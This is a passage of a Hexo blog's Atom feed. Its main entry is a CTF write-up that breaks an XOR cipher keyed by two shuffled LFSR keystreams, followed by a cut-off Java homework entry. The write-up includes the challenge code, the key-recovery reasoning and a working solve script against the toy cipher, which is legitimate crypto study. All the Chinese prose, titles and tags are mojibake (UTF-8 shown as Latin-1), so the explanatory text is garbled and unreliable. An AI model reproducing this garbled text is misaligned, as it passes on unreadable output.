class="line">    GUI()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;div class=&quot;note info flat&quot;&gt;&lt;p&gt;æœ¬é¡¹ç›®æ˜¯ã€Šç½‘ç»œå®‰å…¨Aã€‹è¯¾ç¨‹çš„ä¸€é¡¹é™„åŠ ä½œä¸š&lt;/p&gt;
&lt;/div&gt;

&lt;h2 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h2&gt;&lt;p&gt;æœ¬é¡¹ç›®ä¸»è¦åˆ†</summary>
      
    
    
    
    
    <category term="è¯¾ç¨‹ä½œä¸š" scheme="https://zxy.link/tags/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/"/>
    
    <category term="Python" scheme="https://zxy.link/tags/Python/"/>
    
    <category term="ç½‘ç»œå®‰å…¨A" scheme="https://zxy.link/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8A/"/>
    
  </entry>
  
  <entry>
    <title>LFSRXORé¢˜è§£</title>
    <link href="https://zxy.link/posts/6ced4cb0/"/>
    <id>https://zxy.link/posts/6ced4cb0/</id>
    <published>2021-12-07T08:06:49.000Z</published>
    <updated>2022-01-22T12:42:25.541Z</updated>
    
    <content type="html"><![CDATA[<p>é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªPythonåŠ å¯†ç®—æ³•ï¼Œå°†ä»£ç ç¨ä½œä¿®æ”¹å¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> pylfsr <span class="keyword">import</span> LFSR</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># from secret import flag</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;DASCTF&quot;</span></span><br><span class="line">flag = <span class="built_in">bytes</span>(flag, encoding = <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">chr</span>(a ^ b)).encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        tmp += xor(content[i], key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shuffle_str</span>(<span class="params">s</span>):</span></span><br><span class="line">    str_list = <span class="built_in">list</span>(s)</span><br><span class="line">    random.shuffle(str_list)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> str_list).encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ran_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(random.randint(<span class="number">1</span>, <span class="number">256</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)).encode()</span><br><span class="line">content = ran_str + flag</span><br><span class="line"></span><br><span class="line">L4 = LFSR(fpoly=[<span class="number">4</span>, <span class="number">3</span>], initstate=<span class="string">&#x27;random&#x27;</span>, verbose=<span class="literal">True</span>)</span><br><span class="line">data = L4.runFullCycle()</span><br><span class="line">k4 = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    a = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        a += <span class="built_in">str</span>(L4.<span class="built_in">next</span>()).encode()</span><br><span class="line">    k4 += long_to_bytes(<span class="built_in">int</span>(a, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">L5 = LFSR(fpoly=[<span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>], initstate=<span class="string">&#x27;random&#x27;</span>, verbose=<span class="literal">True</span>)</span><br><span class="line">data = L5.runFullCycle()</span><br><span class="line">k5 = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    a = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        a += <span class="built_in">str</span>(L5.<span class="built_in">next</span>()).encode()</span><br><span class="line">    k5 += long_to_bytes(<span class="built_in">int</span>(a, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">k4 = shuffle_str(k4)</span><br><span class="line">k5 = shuffle_str(k5)</span><br><span class="line"></span><br><span class="line">enc2 = encode(content, k5)</span><br><span class="line">enc1 = encode(content, k4)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc1)</span><br><span class="line"><span class="built_in">print</span>(enc2)</span><br></pre></td></tr></table></figure><p>ç»è¿‡åˆ†æï¼Œè¯¥ä»£ç é€šè¿‡è°ƒç”¨pylfsråŒ…çš„LFSRå‡½æ•°ç”Ÿæˆäº†L4å’ŒL5ï¼Œè¿›è¿‡å¤„ç†ååˆ†åˆ«èµ‹å€¼ç»™k4å’Œk5å˜é‡ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L4 = LFSR(fpoly=[<span class="number">4</span>, <span class="number">3</span>], initstate=<span class="string">&#x27;random&#x27;</span>, verbose=<span class="literal">True</span>)</span><br><span class="line">data = L4.runFullCycle()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L5 = LFSR(fpoly=[<span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>], initstate=<span class="string">&#x27;random&#x27;</span>, verbose=<span class="literal">True</span>)</span><br><span class="line">data = L5.runFullCycle()</span><br></pre></td></tr></table></figure><p>ç„¶åè°ƒç”¨<code>random.shuffle()</code>å‡½æ•°å°†ä¸¤ä¸ªå¯†é’¥æ‰“ä¹±ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">k4 = shuffle_str(k4)</span><br><span class="line">k5 = shuffle_str(k5)</span><br></pre></td></tr></table></figure><p>æœ€åè°ƒç”¨<code>encode()</code>å‡½æ•°å°†ä¸¤ä¸ªå¯†é’¥è¿›è¡Œå¾ªç¯å¼‚æˆ–ï¼Œå¯†é’¥Keyå¾ªç¯ä½¿ç”¨ï¼Œå¾—åˆ°æœ€ç»ˆçš„enc1å’Œenc2ã€‚ä¸‹é¢æˆ‘ä»¬ä½¿ç”¨Pythonçš„äº¤äº’å¼æ¨¡å¼æŸ¥çœ‹ä¸€ä¸‹ä¸¤ä¸ªå¯†é’¥çš„ä¿¡æ¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">L4.info()</span><br><span class="line"><span class="number">4</span> bit LFSR <span class="keyword">with</span> feedback polynomial  x^<span class="number">4</span> + x^<span class="number">3</span> + <span class="number">1</span></span><br><span class="line">Expected Period (<span class="keyword">if</span> polynomial <span class="keyword">is</span> primitive) =  <span class="number">15</span></span><br><span class="line">Current :</span><br><span class="line"> State        :  [<span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>]</span><br><span class="line"> Count        :  <span class="number">15</span></span><br><span class="line"> Output bit   :  <span class="number">1</span></span><br><span class="line"> feedback bit :  <span class="number">0</span></span><br><span class="line"> Output <span class="type">Sequence</span> <span class="number">111000100110101</span></span><br></pre></td></tr></table></figure><p>è°ƒç”¨pylfsråŒ…çš„info()å‡½æ•°å¯ä»¥çœ‹å‡ºï¼ŒL4çš„ä¸€äº›ä¿¡æ¯ã€‚ä½†æ˜¯å› ä¸º<code>initstate=&#39;random&#39;</code>å‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨Expected Period = 15ï¼ŒåŒæ ·æŸ¥çœ‹ä¸€ä¸‹L5çš„infoã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">L5.info()</span><br><span class="line"><span class="number">5</span> bit LFSR <span class="keyword">with</span> feedback polynomial  x^<span class="number">5</span> + x^<span class="number">4</span> + x^<span class="number">2</span> + x^<span class="number">1</span> + <span class="number">1</span></span><br><span class="line">Expected Period (<span class="keyword">if</span> polynomial <span class="keyword">is</span> primitive) =  <span class="number">31</span></span><br><span class="line">Current :</span><br><span class="line"> State        :  [<span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span>]</span><br><span class="line"> Count        :  <span class="number">0</span></span><br><span class="line"> Output bit   :  -<span class="number">1</span></span><br><span class="line"> feedback bit :  -<span class="number">1</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºExpected Period = 31ï¼Œè¿™è¯´æ˜ä¸¤ä¸ªå¯†é’¥çš„é•¿åº¦åˆ†åˆ«ä¸º<code>15</code>å’Œ<code>31</code>ã€‚é€šè¿‡<code>content = ran_str + flag</code>è¯­å¥ï¼Œcontentæ˜¾ç„¶ç”±éšæœºå­—ç¬¦ä¸²å’Œflagæ„æˆï¼Œç”±äºflagçš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºcontentçš„æœ€åä¸€ä¸ªå­—ç¬¦å¿…å®šæ˜¯â€™}â€™ï¼Œä¹Ÿå°±æ˜¯è¯´encå˜é‡æœ€åä¸€ä¸ªå­—èŠ‚å’Œâ€™}â€™å¼‚æˆ–å¿…å°†æ˜¯å¯†é’¥çš„å…¶ä¸­ä¸€ä½ã€‚é€šè¿‡è¿™ä¸ªä¿¡æ¯ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ç€æ‰‹ç ´è§£å¯†é’¥ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬è¦ææ¸…è¯¥é¢˜ç”¨åˆ°çš„ä¸€ç‚¹æ•°è®ºåŸºç¡€ã€‚ç”±äºå¼‚æˆ–çš„æ€§è´¨ï¼Œ<code>k4</code>å¯ä»¥ç”±<code>k5</code>ä¸enc1å’Œenc2å¼‚æˆ–è®¡ç®—å¾—åˆ°ã€‚<br>$$<br>\because  Content_{i} âŠ• k4_{i\ mod\  15} = enc1_{i}\tag{1}<br>$$</p><p>$$<br>Content_{i} âŠ• k5_{i\ mod\  31} = enc2_{i}\tag{2}<br>$$</p><p>$$<br>\therefore k4_{i\ mod\  15} = k5_{i\ mod\  31} âŠ• enc1_{i} âŠ• enc2_{i}\tag{*}<br>$$</p><p>é€šè¿‡ä»£ç æœ€åçš„æ³¨é‡Šï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°enc2çš„é•¿åº¦ä¸º810ä½ï¼Œåˆå› ä¸ºk5ä¸º31ä½ï¼Œå› æ­¤enc2æœ€åä¸€ä¸ªå­—èŠ‚è‚¯å®šæ˜¯ç”±<code>k5[810%31 - 1]</code>å³<code>k5[3]</code>å¼‚æˆ–å¾—åˆ°ã€‚å†™æˆPythonä»£ç å³</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k5[<span class="number">3</span>] = enc2[<span class="number">809</span>] ^ <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ ¹æ®(*)å¼çš„åŸç†ï¼Œä¸æ–­è¿›è¡Œforå¾ªç¯ï¼Œå½“å‘¨æœŸè¶³å¤Ÿå¤šæ—¶ï¼Œå°±å¯ä»¥å¾—åˆ°k4çš„æ‰€æœ‰å­—èŠ‚ï¼Œè‡ªç„¶ä¹Ÿä¼šå¾—åˆ°flagã€‚è¿™é‡Œè¦æ³¨æ„ï¼Œå› ä¸ºk5æ¯”k4å¤šä¸€ä¸ªå­—èŠ‚ï¼Œå› æ­¤k4çš„æ‰€æœ‰å­—èŠ‚å‡å¯é€šè¿‡å¾ªç¯å¼‚æˆ–å¾—åˆ°ï¼Œæ‰€ä»¥æœ€åè¾“å‡ºk4çš„è§£å¯†ç»“æœï¼Œå¦‚æœæåä¼šå‡ºé”™ã€‚è„šæœ¬å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">enc1 = <span class="string">b&#x27;\xbb\xd3\x08\x15\xc6:\x08\xb2\xb2\x9f\xe4p\xc7\xec\x7f\xfd)\xf6f\x9c\xe4\xd12\xaeJ\x81\xb1\x88\xab\xa5V\xa9\x88\x14\xdf`~\xf6\xdbJ\xb4\x06S!0\xbb\xe4\x1a\xe6R\x8e\x84X\x19K\x95\x07C\xe8\xb2\&#x27;\xa9\x80\x15\xec\x8f\x8dY\nK\x85\x99\xb7!\x134\xa9\xb6\x15\xcf&amp;\r\x9b\xe1\x99\xe4]3h~\xf0\xa9\xa5\x14\xee&#125;\xd19l\x14h\x07v *a0\x12\x14\xfe\x0f\x05\xdem\x1d\xe4s2J\x7f\xc28\xf6RR\x8e\xba\xb2m\x18M\xf1\xef!4\x17\xa8\xb4\x14\xc2\x8f\xb9Y:K\xaa\x06T!\x1b\xbb\xfd\xf6Gv\x8e\x9a\xeb\xd9K\xbb\x06N\x9a\x82c\xa9\xa0\x14\xed!\x04\xdbm\x13\xe5w3B\x7f\xd0\xa9\xbf\xb7\x9c\xe3\xd00\x83K\x86\xab3\x7f\xc1\xbb\xfd\x11\x15\xdf\x8e\x80Y\x07\xd8\xe5]2m\xe9\xbb\xce`\x91o\x8f\x8cY!\x81\xe4J\x92\x8c\xa7T\x16E\x15\xf1WMY(\xb8[\x8e2y~\xcbM\x10\x15\xc7\x1fWY\x0cK\x87\xce\xe5 !b\xa8\x83\x14\xec6\xd1!\xc8\x905\xe52L\xf1\xba\xcf\n\x9d\x9d\xe7u\xadm\x06\xe4n2r\xd8\xba\xed\xf6\x7f\x9d\xd8\xd02m\x12G\x07Y\x89\x7f\xc0\xa8\xa4\x15\xe5\x043Y\x1eJ\xae\x07n\x94\x87\xbb\xcf_\x8d\x9d\xd1\x14Y,\x9e\xe5b\xd7\x8c\x7f\xf7\xa8\x8f\x14\xc7\x8f\xb3\xb6\xf1\x93\xe4O\xdd\xc4\xdb\xba\xf6!\x15\xfd.\xd1\x18\xcf\xf6\x03\xea2E\x7f\xe1\xa9\xa5\xfe\x9d\xc9\xd1;\xd9\xee\x05\x06z\xc8\xb2\xbb\xe2\xf7&#123;JW4\xcdm\x1a\xe5U\x8d \x0f&amp;\x14\x7f\xf6\x9d\xd4E\xbf\xc3\xdb\xe4L\xe1\xf7\x90\xbb\xdaZ\xf4\x9d\xd13\xb8m3\xe2D3o~\xf8H\xf6U*\x07lY\x03K\xab\x07~\xa3\x87\xbb\xc9\xf7sAQ\x08Y6J\x86\x07Y\xec\xf7\xbb\xc6s\x15\xc6\x7fEY\x02J\x95\x07Z \x11\xbb\xc6T\x15\xfc-\xd0\x06\xe6\x9f-\x07^ \x15\xbb\xccz\x14\xf3\x8f\x97\xd4l9t\x85\xe8\x8a\xbe\xbb\xf9\xf6f\x9d\xf2\xd19\xa2K\xb6\xcd\xcf\xf6~\xd5\xa9\xaa\x15\xd8\x8e\xb3\x81m9\xe4f\xb2!\x1e\xba\xd8s\xfd\x11\x08W\xa1l;\x01\x07_!\x11\xbb\xdd\xf6x\x9d\xf0\x17Y\x15\xfe\x02\xc7\xa0!.W\xa9\xa5\x8f\x9c\xe8\xd1\x12m\x04\xe5s3Q~\xdd\xa9\xa3\x15\xdb\x8f\xac\xaf\xec\xbb\x10\xde2_\xba\xba\xe8\xf6f.\x1e\xd1\x17l\x06\xe4U\xdd\xf0\xd6~\x0fA\x14\xcb\x8e\xb0Y\x1fJ\xb2\xe4\xb3!&quot;\xba\xfeU\x14\xedY\xd0&gt;l-~\x06P 1\xbb\xf2\xf6waD\xd1(m\x12`\x06@\xb6~\xfa\xa9\xb1\xb0\x9d\xfb\x18\xfbm&amp;\xe4v2w\xce\xba\xcbo\xd5\x07\x11QX&lt;J\xbd\xb22O\x7f\xd8x&gt;\xc8\x9c\xd3\xd03\x9d\xb5\x1e\xd72S\xf2ry\xf1W\x9c\xc89Y\rK\x8f\xff\x8a\xe0\xb5&#123;\xa9\xae\xb1\x9d\xdd\xd1=\xbeK\xa3\x06e!\x08\xba\xd2\xf6j\x9c\xf6\xd0\x0fl#\xe5o\xf5\xaa~\xc2\xa9\x99\x15\xea6\xd1:\xe7\xa8\xe4n\xbb \nV\xa9\x91\x14\xf9&#125;\xd0!m/\xe5|2o\x81\xba\xf8\r\x14\xeb\tR\xc9\xec\xdd`\xbf\xc6\x81\xdfKXW\xb3o.%\xa9\xcd\xb9\x14\xfd\x97\x83\x8eO\n\x03\xb6iuu\xab\x9d\xbc\x15\xf4\xc3\xd6\xc1&#x27;</span></span><br><span class="line">enc2 = <span class="string">b&#x27;p\xfd\x1ff\xcaB\xa5\xe6`\x87\xa8\x8ci\x855\x92O8P\xa5&#125;^\xd8\xed\x1a\x88=c\xe0\x9f\xedq\xf8\xe1%\x7fX\xd2\xba\xbe\x03\xa8\x9a\x9c\x075\x98&quot;\xca\xed\xa4C^\xc6.j\xec\xfa\x10\xa7\xd9\x01\x06\x87\x90f\xcc\xf6\x1b\x0c\xde\xcc,\xfb\xf0\xc74\x94\xcfj\x8ay\xd5\xd2`.@\xed\xc2\xd8!DSp\xf5\x12f\xf1\xf6#\x80\xbe\x16\xa8\xaeF\xd0\xd1\xd4\xad\xb9\xf7#\x16\x08\xb2[\x1a\x87\x8b\xa0\xfaEF\xbf\x86\x8b\x8c\x90\xa4\xd5\xfbcR\xe2W\x9c\n5\x8b\xcfQ&quot;\xf2\x16\x10\xb2I\x1a\x88\x8b\x8cj\x16\xebp\xccS\xd2\x90\xa8|q\x05\xafq\xfa\xcaHE&#123;\x1a\xba#\xfd\x17/\xb2L\x1a\x87\x8a\x90\xc9Dmp\xef\x0ef\xf2Z|S\x00R\xfc\x1c\x9d\n5\x84\xceS\xb0\xa4M_\xff\xb9\x1a\x8a\x1d\\\x98D\\p\xcb*f\xdcV\xd0\xd5Q\xec\x1a\xfa\xf0\x91\xa8\xd4\x8a\xca\x9c-\x17\x07\xb2_\xff\n\x8a\x83\xfb\xc2\x00\x10\x87\x83\xaeF\xf7#\xd4\xbe\&#x27;\xa9\x8a$IMp\x14\xe8\xc0\xa4z\xd1\xb2H\xe6e\x8b\xb0\xcf\xb1\x01&lt;\x87\x88g\xc2Q|H\xbe9\xa9\xad\x9c#4\x8cl8I\x0c\x17$\xb3&#125;\x1b\x94\x01:j7\x00;\x86\xbd\xd2i\xf6\x1a\xa4\&#x27;R\xf6?\x9c\x08\xe1\xd4\xab\xdd\x8f\xa4[_\xca/@\xed\xe86\xf7\x9c\x018i\x04\xc3\x90\xa8\xaa\x0c\xde\xf2\xa8\xba?\xf4\xd39\xce\\&quot;\xfe\x16\x0cY/]\xed\xe9l\xce\xa5\x018o,g\xdb\xf7\x12\xdag\xb6=\xfa\xccHgk\xcfH\xbf\x18\x9e\xbd\xb3u\x8f\n$Hk\x0e\xd3\xa6i\xe1\x15=\x16&#125;R]\xb3\xa8\x82\x9b\x0b4\x9a\xcf&#123;\xc2\xa4V\xe8:\x93\x1a\x83\x8a\x97j\t\x82\x88\x86\x80f\xf6*\xa2\xd5\xbe\x08\xa9\x98\x9c#\xf8\\\xceV\xa7\xa5L\xae&amp;/t\xec\xfb\xd9\x02Dnp\xe8Cf\xf0U&#125;R4\x87a\xfb\xf0I_\xd4\xaa\xb4&quot;\xca\x16\x18&gt;/i&#125;\t\x03\xc1\x84\x00!\x86\x93g\xed\xf7\x1d\xc3\xbf\x01c\x06KI[\xd5\x929g\xa4t\x87\xb2\\\x1b\x8d\x0b\xd9\x0bDp\xf5om\xe1\x16\x0e&#125;|ZR\xc4\xfb\xf2H@\xd4\xa28\\c\x17&amp;\x07\xc8\xda~\x8b\x88\x86DS\xeb\x87\x87f\xda\xf73\r\xcaS\xd9\xfa\xfaI`\xd5\x889^R\x97\xaeF\xf6\x1a\x92N\xd8*Er\xc3\x16\xe0)\x91\xba|_Q\x83\x00&gt;;\xff5\x82\xceX&quot;\xd7\x17\x08P\xae\x1a\xb1\x8a\x8f\xc9Ep\xa7\x86\x86g\xf6m|o\xbf\x1c\xa9\xa1\x9c+\xc9\x1e\xcfI#\xfc\x92^\xc1\xb8\x1b\xad\x8a\x9e\xceEu\xb8$\xe0\x0b\x90\x87&#125;[\x0fS\xcab]\xd2\xaaU\xcfh&quot;\xfc\xa2_\xdd/y&lt;C\x05k\x18\x00\x1aw\x1e\x9cA\xf6\x0f\x80w\x83\xae\xb8\x9d\x0e\xdc\xd4\xaf9H\\\xaf\x9ey\xef\x1b\xb4.\xd99Dd\xa2\x87\xa7f\xc6\xf6\n\x0c\xc4R\xd7\xfa\xe4Hc\xd4\xa78Jc\x9c^\xca.u\xed\xfcak&amp;\x8b\x92\x87\x88\xee\x90\x83\x90\x0c\xd9R\xcd\x08\x9c04\xb1\xceC&quot;\xea\xe9^\xe3\xd4\x1a\x9a\x0c[\xfa\xc5\x97\xf5&gt;\x15\xc71\x06\x8d\xac\x19\xa0\t\x0el\xe9\xc6%4\x9d\x80U\xe3\xfdF\x8d\xee\x17.+\x9b\xb3\xf0\x83w\x16\xd9&#x27;</span></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;&quot;</span></span><br><span class="line">k5 = []</span><br><span class="line">k4 = []</span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    k4.append(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">    k5.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">k5[<span class="number">3</span>] = <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>) ^ enc2[<span class="number">809</span>]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">810</span>, <span class="number">31</span>):</span><br><span class="line">    k4[c % <span class="number">15</span>] = k5[<span class="number">3</span>] ^ enc1[c] ^ enc2[c]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">810</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(k4[c % <span class="number">15</span>] ^ enc1[c]) <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(k4[c % <span class="number">15</span>] ^ enc1[c]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªPythonåŠ å¯†ç®—æ³•ï¼Œå°†ä»£ç ç¨ä½œä¿®æ”¹å¦‚ä¸‹æ‰€ç¤ºã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;sp</summary>
      
    
    
    
    
    <category term="è¯¾ç¨‹ä½œä¸š" scheme="https://zxy.link/tags/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/"/>
    
    <category term="å¯†ç å­¦" scheme="https://zxy.link/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Javaè¯­è¨€åŠç½‘ç»œç¼–ç¨‹ä½œä¸š</title>
    <link href="https://zxy.link/posts/2f9013ea/"/>
    <id>https://zxy.link/posts/2f9013ea/</id>
    <published>2021-11-20T04:47:00.000Z</published>
    <updated>2022-01-23T12:30:07.553Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä½œä¸šä¸€"><a href="#ä½œä¸šä¸€" class="headerlink" title="ä½œä¸šä¸€"></a><strong>ä½œä¸šä¸€</strong></h2><ol><li>è®¡ç®—å¤šé¡¹å¼1ï¼+2ï¼+3ï¼â€¦+n!ï¼Œå½“å¤šé¡¹å¼ä¹‹å’Œè¶…è¿‡10000æ—¶åœæ­¢ï¼Œå¹¶è¾“å‡ºç´¯åŠ ä¹‹å’Œä»¥åŠnçš„å€¼ã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>Â <span class="class"><span class="keyword">class</span>Â <span class="title">factorial</span>Â </span>&#123;Â Â </span><br><span class="line">Â Â </span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">public</span>Â <span class="keyword">static</span>Â <span class="keyword">void</span>Â <span class="title">main</span><span class="params">(String[]Â args)</span>Â </span>&#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">int</span>Â sumÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">int</span>Â nÂ =Â <span class="number">1</span>;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">int</span>Â nextÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">while</span>Â (nextÂ &lt;=Â <span class="number">10000</span>)Â &#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â sumÂ =Â sumÂ +Â fun(n);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â nextÂ =Â sumÂ +Â fun(++n);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â System.out.printf(<span 